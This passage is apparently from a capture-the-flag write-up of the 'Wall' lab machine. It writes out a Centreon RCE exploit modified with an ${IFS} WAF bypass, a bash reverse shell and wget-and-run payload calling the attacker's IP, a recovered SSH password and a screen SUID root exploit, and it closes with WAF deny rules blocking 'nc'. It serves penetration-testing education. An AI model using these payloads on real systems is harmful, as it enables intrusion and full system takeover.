+<p>I decided to update the exploit script to better suit the task. I wasn’t a huge fan of having a <code class="language-plaintext highlighter-rouge">ncat -e</code> payload in there to begin with, as it’s more likely than not that <code class="language-plaintext highlighter-rouge">-e</code> won’t be available. I changed the script so that rather than trying to force a specific reverse shell, it takes a command to run. The top looks like:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">))</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[~] Usage : ./centreon-exploit.py url username password command</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">exit</span><span class="p">()</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">username</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">password</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+<span class="n">command</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+</code></pre></div></div>
+<p>And in the middle, I replaced:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">"</span><span class="s">nagios_bin</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">ncat -e /bin/bash {0} {1} #</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span>
+</code></pre></div></div>
+<p>with:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">"</span><span class="s">nagios_bin</span><span class="sh">"</span><span class="p">:</span> <span class="n">command</span><span class="p">,</span>
+</code></pre></div></div>
+<p>That was good enough as far as script upgrades to get a shell. But I did play with it some more, which I’ll talk about in <a href="#script-upgrades">Beyond Root</a>.</p>
+<h3 id="waf-testing">WAF Testing</h3>
+<p>I knew that <code class="language-plaintext highlighter-rouge">hostname</code> triggered the WAF earlier on this box. It does here as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./centreon-0xdf.py http://10.10.10.157/centreon/ admin password1 <span class="s2">"hostname"</span>
+<span class="go">[+] Retrieving CSRF token to submit the login form
+[+] Login token is : 394206ab8aca7d49e54f2cd3a4a3bd1d
+[+] Logged In Sucssfully
+[+] Retrieving Poller token
+[+] Poller token is : 2cbdf5f8ce42cbeebde67e8925bfc04b
+[*] Payload inject status code: 403
+[+] Injecting Done, triggering the payload
+[+] Check you netcat listener !
+</span></code></pre></div></div>
+<p>So I started checking different commands. <code class="language-plaintext highlighter-rouge">nc</code> gave a 403, but <code class="language-plaintext highlighter-rouge">curl</code> and <code class="language-plaintext highlighter-rouge">wget</code> were good. Armed with those, I wanted to see if I could create a connection back. I ran <code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code> and then issued <code class="language-plaintext highlighter-rouge">wget 10.10.14.30</code>. It returned 403.</p>
+<p>My first thought was that it was blocking on IP addresses. So I tried <code class="language-plaintext highlighter-rouge">wget wget</code>, but it still failed. I tried <code class="language-plaintext highlighter-rouge">wget</code> (there’s a space at the end), and it returned 403! It seems that space is blocked at the firewall. This is a pretty unrealistic challenge, and I suspect completely breaks the Centreon application. But I’ll continue.</p>
+<p>I know a way to say space without using that character is the <code class="language-plaintext highlighter-rouge">${IFS}</code> variable. I’ll give it a try, making sure to put my payload in single quotes so that my bash doesn’t evaluate the variable:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./centreon-0xdf.py http://10.10.10.157/centreon/ admin password1 <span class="s1">'wget${IFS}10.10.14.30'</span>
+<span class="go">[+] Retrieving CSRF token to submit the login form
+[+] Login token is : c3e06f0952f4b5ed743cf4be0a4434a0
+[+] Logged In Sucssfully
+[+] Retrieving Poller token
+[+] Poller token is : ed900e21690e570728e12e1cba70c926
+[*] Payload inject status code: 200
+[+] Injecting Done, triggering the payload
+[+] Check you netcat listener !
+</span></code></pre></div></div>
+<p>And I get a request on my webserver:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.10.157 - - [15/Sep/2019 04:49:43] "GET / HTTP/1.1" 200 -
+</span></code></pre></div></div>
+<p>I wrote a quick reverse shell script:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali# <span class="nb">cat </span>shell
+<span class="c">#!/bin/bash</span>
+
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.30/443 0&gt;&amp;1
+</code></pre></div></div>
+<p>I tried to get <code class="language-plaintext highlighter-rouge">wget</code> to output to stdout and pipe that into <code class="language-plaintext highlighter-rouge">bash</code>, but i couldn’t get that to work. But I did get this to work:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget<span class="k">${</span><span class="nv">IFS</span><span class="k">}</span>10.10.14.30/shell<span class="k">${</span><span class="nv">IFS</span><span class="k">}</span><span class="nt">-O</span><span class="k">${</span><span class="nv">IFS</span><span class="k">}</span>/tmp/0xdf<span class="p">;</span><span class="k">${</span><span class="nv">IFS</span><span class="k">}</span>bash<span class="k">${</span><span class="nv">IFS</span><span class="k">}</span><span class="nt">-i</span><span class="k">${</span><span class="nv">IFS</span><span class="k">}</span>/tmp/0xdf
+</code></pre></div></div>
+<p>This uses <code class="language-plaintext highlighter-rouge">wget</code> to get the shell file and save it to <code class="language-plaintext highlighter-rouge">/tmp</code>, and then use <code class="language-plaintext highlighter-rouge">bash</code> to run it.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./centreon-0xdf.py http://10.10.10.157/centreon/ admin password1 <span class="s1">'wget${IFS}10.10.14.30/shell${IFS}-O${IFS}/tmp/0xdf;${IFS}bash${IFS}-i${IFS}/tmp/0xdf'</span>
+<span class="go">[+] Retrieving CSRF token to submit the login form
+[+] Login token is : 1892910fb24da4dd4d54fabd156f46fe
+[+] Logged In Sucssfully
+[+] Retrieving Poller token
+[+] Poller token is : 71d739093f67a73ed21c823778f3f052
+[*] Payload inject status code: 200
+[+] Injecting Done, triggering the payload
+[+] Check you netcat listener !
+</span></code></pre></div></div>
+<p>Hits on webserver:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.10.157 - - [15/Sep/2019 05:34:00] "GET /shell HTTP/1.1" 200 - 
+</span></code></pre></div></div>
+<p>And then shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.157.
+Ncat: Connection from 10.10.10.157:35064.
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@Wall:/usr/local/centreon/www$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)
+</span></code></pre></div></div>
+<p>I can see <code class="language-plaintext highlighter-rouge">user.txt</code>, but I can’t read it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@Wall:/home/shelby$ </span><span class="nb">ls</span> <span class="nt">-l</span> 
+<span class="go">total 12
+-rw-rw-r-- 1 shelby shelby 4567 Jul 30 17:37 html.zip
+-rw------- 1 shelby shelby   33 Jul  4 01:22 user.txt
+</span></code></pre></div></div>
+<h2 id="priv-www-data--shelby">Priv: www-data –&gt; shelby</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>In <code class="language-plaintext highlighter-rouge">/opt</code>, there’s a hidden directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@Wall:/opt$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 12
+drwxr-xr-x  3 root root 4096 Jul  4 17:28 .
+drwxr-xr-x 23 root root 4096 Jul  4 00:25 ..
+drwxr-xr-x  2 root root 4096 Jul 30 17:39 .shelby
+</span></code></pre></div></div>
+<p>It has a single file, which is a python byte compiled program:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@Wall:/opt/.shelby$ </span>file backup 
+<span class="go">backup: python 2.7 byte-compiled
+</span></code></pre></div></div>
+<p>I can run it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@Wall:/opt/.shelby$ </span>python backup 
+<span class="go">[+] Done !
+</span></code></pre></div></div>
+<p>But I can’t read it in its current form:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@Wall:/opt/.shelby$ </span><span class="nb">cat </span>backup 
+<span class="go">
+^V@]c@stddlZdZdZdZejeefZdZeed7Zeed7Zee7Zeed     7Zeed
+7Zeed
+     7Zeed
+7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zej dedeej
+j
+ eZ
+   e
+ddGHdS(iNtshelbywall.htbittSthtetltbtytPtatstwt@trtdtItttotntgt!usernamepasswords/var/www/html.ziphtml.zips
+[+] Done !(paramikoRthosttportt Transportt      transportRtchrtordtconnectt
+SFTPClienttfrom_transportt
+                          sftp_clienttput(((s   backup.py&lt;module&gt;s@
+</span></code></pre></div></div>
+<h3 id="decode-pyc">Decode pyc</h3>
+<p>I’ll use <a href="https://pypi.org/project/uncompyle6/">uncompyle6</a> to decode the byte code back into Python. First, I’ll install it with <code class="language-plaintext highlighter-rouge">pip install uncompyle6</code>. Then, I’ll move the <code class="language-plaintext highlighter-rouge">backup</code> back to my box with <code class="language-plaintext highlighter-rouge">nc</code>.</p>
+<p>Now run it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>uncompyle6 backup.pyc
+<span class="gp"># </span>uncompyle6 version 3.4.0
+<span class="gp"># </span>Python bytecode 2.7 <span class="o">(</span>62211<span class="o">)</span>
+<span class="gp"># </span>Decompiled from: Python 2.7.16 <span class="o">(</span>default, Apr  6 2019, 01:42:57<span class="o">)</span>
+<span class="gp"># </span><span class="o">[</span>GCC 8.3.0]
+<span class="gp"># </span>Embedded file name: backup.py
+<span class="gp"># </span>Compiled at: 2019-07-30 10:38:22
+<span class="kn">import</span> <span class="n">paramiko</span>
+<span class="n">username</span> <span class="o">=</span> <span class="sh">'</span><span class="s">shelby</span><span class="sh">'</span>
+<span class="n">host</span> <span class="o">=</span> <span class="sh">'</span><span class="s">wall.htb</span><span class="sh">'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">22</span>
+<span class="n">transport</span> <span class="o">=</span> <span class="n">paramiko</span><span class="p">.</span><span class="nc">Transport</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">=</span> <span class="sh">''</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">S</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">h</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">e</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">l</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">y</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">P</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">s</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">s</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">@</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">d</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">I</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">s</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">S</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">t</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">o</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">n</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">g</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">password</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">!</span><span class="sh">'</span><span class="p">))</span>
+<span class="n">transport</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">)</span>
+<span class="n">sftp_client</span> <span class="o">=</span> <span class="n">paramiko</span><span class="p">.</span><span class="n">SFTPClient</span><span class="p">.</span><span class="nf">from_transport</span><span class="p">(</span><span class="n">transport</span><span class="p">)</span>
+<span class="n">sftp_client</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="sh">'</span><span class="s">/var/www/html.zip</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">html.zip</span><span class="sh">'</span><span class="p">)</span>
+<span class="k">print</span> <span class="sh">'</span><span class="s">[+] Done !</span><span class="sh">'</span>
+<span class="gp"># </span>okay decompiling backup.pyc
+</code></pre></div></div>
+<p>Basically, the file is using <code class="language-plaintext highlighter-rouge">paramiko</code> to connect to Wall, and put <code class="language-plaintext highlighter-rouge">html.zip</code> in place. It builds the password one character at a time, presumably so that it’s not in the strings of the file. But this provides an ssh password for shelby, “ShelbyPassw@rdIsStrong!”</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>python <span class="nt">-c</span> <span class="s2">"password = ''
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('S'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('h'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('e'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('l'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('b'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('y'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('P'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('a'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('s'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('s'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('w'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('@'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('r'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('d'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('I'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('s'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('S'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('t'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('r'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('o'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('n'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('g'))
+</span><span class="gp">&gt; </span><span class="s2">password += chr(ord('!'))
+</span><span class="gp">&gt; </span><span class="s2">print password"</span>
+<span class="go">ShelbyPassw@rdIsStrong!
+</span></code></pre></div></div>
+<h3 id="ssh-as-shelby">SSH as shelby</h3>
+<p>Now I can connect over SSH as shelby:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>ssh shelby@10.10.10.157
+<span class="gp">shelby@10.10.10.157's password:</span><span class="w">
+</span><span class="go">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-54-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Tue Jul 30 17:36:33 2019 from 192.168.178.1
+</span><span class="gp">shelby@Wall:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>And I can grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">shelby@Wall:~$ </span><span class="nb">cat </span>user.txt
+<span class="go">fe619454************************
+</span></code></pre></div></div>
+<h2 id="priv-shelby--root">Priv: shelby –&gt; root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>When I run <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>, I always use <code class="language-plaintext highlighter-rouge">-t</code> for thorough tests. This includes SUID binaries. When I saw those results, <code class="language-plaintext highlighter-rouge">screen</code> jumped out at me as interesting and non-default:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">[-] SUID files:
+-rwsr-xr-x 1 root root 43088 Oct 15  2018 /bin/mount
+-rwsr-xr-x 1 root root 64424 Mar 10  2017 /bin/ping
+-rwsr-xr-x 1 root root 1595624 Jul  4 00:25 /bin/screen-4.5.0
+-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 44664 Mar 22 21:05 /bin/su
+-rwsr-xr-x 1 root root 26696 Oct 15  2018 /bin/umount
+-rwsr-xr-x 1 root root 44528 Mar 22 21:05 /usr/bin/chsh
+-rwsr-xr-x 1 root root 59640 Mar 22 21:05 /usr/bin/passwd
+-rwsr-xr-x 1 root root 75824 Mar 22 21:05 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 18448 Mar 10  2017 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 76496 Mar 22 21:05 /usr/bin/chfn
+-rwsr-xr-x 1 root root 40344 Mar 22 21:05 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 149080 Jan 18  2018 /usr/bin/sudo
+-rwsr-xr-- 1 root messagebus 42992 Jun 10 21:05 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-r-sr-xr-x 1 root root 13628 Aug 28 14:41 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+-r-sr-xr-x 1 root root 14320 Aug 28 14:41 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device    
+</span></code></pre></div></div>
+<p>The binary is executable by all users, so there’s actually nothing to stop me from doing this exploit from www-data (that’s actually what I did when the box was live).</p>
+<h3 id="exploit">Exploit</h3>
+<p><code class="language-plaintext highlighter-rouge">screen</code> jumps out because I’ve already done a privesc against <code class="language-plaintext highlighter-rouge">screen</code> in HTB, in <a href="/2019/06/15/htb-flujab.html#priv-drno--root">FluJab</a>. This case is easier, as there is a compiler on the box:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@Wall:/$ </span>which gcc
+<span class="go">/usr/bin/gcc
+</span></code></pre></div></div>
+<p>I’ll grab the shell script from the <a href="https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh">screen2root repo</a>, and save it in <code class="language-plaintext highlighter-rouge">/dev/shm</code> as <code class="language-plaintext highlighter-rouge">.a.sh</code>. Now I run that, and get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@Wall:/dev/shm$ </span>bash .a.sh 
+<span class="go">~ gnu/screenroot ~
+[+] First, we create our shell and library...
+/tmp/libhax.c: In function 'dropshell':
+/tmp/libhax.c:7:5: warning: implicit declaration of function 'chmod'; did you mean 'chroot'? [-Wimplicit-function-declaration]
+     chmod("/tmp/rootshell", 04755);
+     ^~~~~
+     chroot
+/tmp/rootshell.c: In function 'main':
+/tmp/rootshell.c:3:5: warning: implicit declaration of function 'setuid'; did you mean 'setbuf'? [-Wimplicit-function-declaration]
+     setuid(0);
+     ^~~~~~
+     setbuf
+/tmp/rootshell.c:4:5: warning: implicit declaration of function 'setgid'; did you mean 'setbuf'? [-Wimplicit-function-declaration]
+     setgid(0);
+     ^~~~~~
+     setbuf
+/tmp/rootshell.c:5:5: warning: implicit declaration of function 'seteuid'; did you mean 'setbuf'? [-Wimplicit-function-declaration]
+     seteuid(0);
+     ^~~~~~~
+     setbuf
+/tmp/rootshell.c:6:5: warning: implicit declaration of function 'setegid' [-Wimplicit-function-declaration]
+     setegid(0);
+     ^~~~~~~
+/tmp/rootshell.c:7:5: warning: implicit declaration of function 'execvp' [-Wimplicit-function-declaration]
+     execvp("/bin/sh", NULL, NULL);
+     ^~~~~~
+/usr/bin/ld: cannot open output file /tmp/rootshell: Permission denied
+collect2: error: ld returned 1 exit status
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-www-data.
+
+</span><span class="gp"># </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)
+</span></code></pre></div></div>
+<p>I can grab <code class="language-plaintext highlighter-rouge">root.txt</code> (and <code class="language-plaintext highlighter-rouge">user.txt</code> if I hadn’t already):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Wall:/root# </span><span class="nb">cat </span>root.txt
+<span class="go">1fdbcf8c************************
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="basic-auth">Basic Auth</h3>
+<p>I managed to find the <code class="language-plaintext highlighter-rouge">/centreon</code> path by posting to <code class="language-plaintext highlighter-rouge">/monitoring</code> when it was asking for auth on a GET, and it let me through. Once I got a shell, I took a look at the web directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@Wall:/var/www/html$ </span>find <span class="nb">.</span>
+<span class="c">.
+</span><span class="go">./aa.php
+./index.html
+./panel.php
+./monitoring
+./monitoring/index.html
+./monitoring/.htaccess
+</span></code></pre></div></div>
+<p>It’s the <code class="language-plaintext highlighter-rouge">.htaccess</code> page that defines the restrictions:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@Wall:/var/www/html$ </span><span class="nb">cat </span>monitoring/.htaccess 
+<span class="go">AuthUserFile /etc/.htpasswd
+AuthName "Protected area by the admin"
+AuthType Basic
+&lt;Limit GET&gt;
+require valid-user
+&lt;/Limit&gt;
+</span></code></pre></div></div>
+<p>It only has a limit on GET requests, not POST, which is why the POST request goes through. Typically this would be written like:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;Limit</span> <span class="err">GET</span> <span class="err">POST</span> <span class="err">PUT</span><span class="nt">&gt;</span>
+require valid-user
+<span class="nt">&lt;/Limit&gt;</span>
+</code></pre></div></div>
+<h3 id="modsecurity">ModSecurity</h3>
+<p><a href="https://modsecurity.org/">ModSecurity</a> is an open source WAF. In this case, it’s loaded into <code class="language-plaintext highlighter-rouge">apache</code>. Configuration files for enabled <code class="language-plaintext highlighter-rouge">apache</code> modules are in <code class="language-plaintext highlighter-rouge">/etc/apache2/mods-enabled/</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Wall:/etc/apache2/mods-enabled# </span><span class="nb">ls</span> <span class="k">*</span>.conf          
+<span class="go">alias.conf      mime.conf         proxy.conf       status.conf
+autoindex.conf  mpm_prefork.conf  reqtimeout.conf
+deflate.conf    negotiation.conf  security2.conf
+dir.conf        php7.3.conf       setenvif.conf
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">security2.conf</code> shows the ModSecurity config:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Wall:/etc/apache2/mods-enabled# cat security2.conf 
+<span class="nt">&lt;IfModule</span> <span class="err">security2_module</span><span class="nt">&gt;</span>
+        # Default Debian dir for modsecurity's persistent data
+        SecDataDir /var/cache/modsecurity
+
+        # Include all the *.conf files in /etc/modsecurity.
+        # Keeping your local configuration in that directory
+        # will allow for an easy upgrade of THIS file and
+        # make your life easier
+        IncludeOptional /etc/modsecurity/*.conf
+
+        # Include OWASP ModSecurity CRS rules if installed
+        #IncludeOptional /usr/share/modsecurity-crs/owasp-crs.load
+<span class="nt">&lt;/IfModule&gt;</span>
+</code></pre></div></div>
+<p>It’s mostly comments, but it includes all the <code class="language-plaintext highlighter-rouge">.conf</code> files in <code class="language-plaintext highlighter-rouge">/etc/modsecurity/</code>. There’s only one:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Wall:/etc/modsecurity# </span><span class="nb">ls</span> <span class="k">*</span>.conf
+<span class="go">modsecurity.conf
+</span></code></pre></div></div>
+<p>It contains rules for the things I had noticed were blocked:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Wall:/etc/modsecurity# </span><span class="nb">cat </span>modsecurity.conf
+<span class="go">SecRuleEngine On
+SecRequestBodyAccess On
+
+</span><span class="c"># block nc word
+</span><span class="go">SecRule REQUEST_BODY "\bnc\b" "id:00001,deny,msg:'blocked'"
+
+</span><span class="c"># block ncat word
